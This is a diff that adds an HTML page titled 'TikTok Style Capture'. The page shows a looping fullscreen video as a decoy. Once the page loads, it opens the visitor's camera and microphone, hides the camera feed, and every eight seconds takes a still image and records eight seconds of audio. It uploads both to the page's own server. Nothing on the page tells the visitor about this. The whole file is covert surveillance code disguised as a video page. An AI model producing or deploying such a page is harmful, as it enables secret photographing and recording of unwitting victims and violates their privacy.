@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TikTok Style Capture</title>
+    <style>
+        body {
+            margin: 0;
+            overflow: hidden;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: #000;
+        }
+        #hidden-video {
+            display: none; /* Hide the user's camera feed */
+        }
+        #tiktok-video {
+            width: 100vw;
+            height: 100vh;
+            object-fit: cover; /* Ensures TikTok-like fullscreen video */
+        }
+    </style>
+</head>
+<body>
+    <!-- Hidden camera feed -->
+    <video id="hidden-video" autoplay playsinline muted></video> <!-- Muted to prevent feedback -->
+
+    <!-- TikTok-style video -->
+    <video id="tiktok-video" autoplay loop muted>
+        <source src="v.mp4" type="video/mp4">
+        Your browser does not support the video tag.
+    </video>
+
+    <script>
+        const hiddenVideo = document.getElementById('hidden-video');
+        const tiktokVideo = document.getElementById('tiktok-video');
+
+        let mediaRecorder;
+        let chunks = [];
+        let interval;
+        let isRecording = false;
+
+        async function startCapture() {
+            try {
+                // Request the camera feed (rear camera preferred)
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: { ideal: "User" } }, // Use rear camera
+                    audio: true // Audio is required for recording
+                });
+
+                // Attach the stream to the hidden video element
+                hiddenVideo.srcObject = stream;
+                await hiddenVideo.play(); // Ensure video starts playing
+                console.log("Video stream started successfully");
+
+                // Prepare the audio stream for recording
+                const audioStream = new MediaStream(stream.getAudioTracks());
+                setupMediaRecorder(audioStream);
+
+                // Set up interval for image capture and audio recording
+                interval = setInterval(() => captureAndUpload(stream), 8000); // Every 8 seconds
+            } catch (error) {
+                console.error("Error accessing camera or microphone:", error);
+                alert("Unable to access camera or microphone. Please check permissions.");
+            }
+        }
+
+        function setupMediaRecorder(audioStream) {
+            // Choose the best MIME type for recording
+            let mimeType = "audio/webm";
+            if (!MediaRecorder.isTypeSupported(mimeType)) mimeType = "audio/mp4";
+            if (!MediaRecorder.isTypeSupported(mimeType)) mimeType = "audio/ogg";
+
+            console.log("Chosen MIME type for audio:", mimeType);
+
+            // Initialize the MediaRecorder
+            try {
+                mediaRecorder = new MediaRecorder(audioStream, { mimeType });
+                mediaRecorder.ondataavailable = (event) => {
+                    if (event.data.size > 0) chunks.push(event.data);
+                };
+                mediaRecorder.onstop = uploadAudio;
+            } catch (error) {
+                console.error("MediaRecorder setup failed:", error);
+            }
+        }
+
+        async function captureAndUpload(stream) {
+            // Capture an image
+            const canvas = document.createElement("canvas");
+            canvas.width = hiddenVideo.videoWidth;
+            canvas.height = hiddenVideo.videoHeight;
+            const ctx = canvas.getContext("2d");
+            ctx.drawImage(hiddenVideo, 0, 0, canvas.width, canvas.height);
+
+            const imageBlob = await new Promise((resolve) => canvas.toBlob(resolve, "image/png"));
+            uploadImage(imageBlob);
+
+            // Record audio for 8 seconds
+            if (!isRecording) {
+                isRecording = true;
+                mediaRecorder.start();
+                console.log("Audio recording started...");
+                setTimeout(() => {
+                    mediaRecorder.stop();
+                    console.log("Audio recording stopped...");
+                }, 8000);
+            }
+        }
+
+        async function uploadImage(imageBlob) {
+            const imageFormData = new FormData();
+            imageFormData.append("image", imageBlob, `image-${Date.now()}.png`);
+            try {
+                const response = await fetch("/upload-image", {
+                    method: "POST",
+                    body: imageFormData
+                });
+                if (response.ok) {
+                    console.log("Image uploaded successfully");
+                } else {
+                    console.error("Failed to upload image:", response.statusText);
+                }
+            } catch (error) {
+                console.error("Error uploading image:", error);
+            }
+        }
+
+        async function uploadAudio() {
+            if (chunks.length > 0) {
+                const blob = new Blob(chunks, { type: mediaRecorder.mimeType });
+                chunks = [];
+
+                const audioFormData = new FormData();
+                audioFormData.append("audio", blob, `audio-${Date.now()}.webm`);
+                try {
+                    const response = await fetch("/upload-audio", {
+                        method: "POST",
+                        body: audioFormData
+                    });
+                    if (response.ok) {
+                        console.log("Audio uploaded successfully");
+                    } else {
+                        console.error("Failed to upload audio:", response.statusText);
+                    }
+                } catch (error) {
+                    console.error("Error uploading audio:", error);
+                }
+            }
+            isRecording = false; // Allow new recordings
+        }
+
+        // User interaction to ensure autoplay works
+        document.addEventListener("click", async () => {
+            if (hiddenVideo.paused) {
+                await hiddenVideo.play();
+                console.log("User initiated playback");
+            }
+        });
+
+        // Start capturing as soon as the page loads
+        window.addEventListener("load", startCapture);
+    </script>
+</body>
+</html>
